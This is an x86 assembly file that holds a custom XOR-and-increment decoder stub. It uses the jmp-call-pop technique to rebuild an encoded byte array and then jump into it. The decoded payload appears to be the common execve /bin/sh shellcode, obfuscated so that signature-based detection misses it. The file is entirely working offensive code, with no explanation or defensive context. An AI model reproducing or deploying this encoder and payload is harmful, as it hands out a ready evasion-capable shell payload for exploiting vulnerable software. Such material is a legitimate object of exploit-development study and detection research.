section .text

global _start

_start:
	jmp short shellcodestr

decode:
	pop esi
	push esi

xored:
	xor byte[esi],0x55
	jz dec
	inc esi
	jmp short xored

dec:
	pop esi
	xor ecx,ecx
	mov cl,25
decr:
	inc byte[esi]
	inc esi
	loop decr

	jmp short shellcode

shellcodestr:
	call decode
	shellcode : db 0x65,0xea,0x1a,0x32,0x38,0x7b,0x27,0x32,0x32,0x7b,0x7b,0x34,0x3d,0xdd,0xb7,0x1a,0xdd,0xb4,0x07,0xdd,0xb5,0xfa,0x5f,0x99,0x2a,0x55 
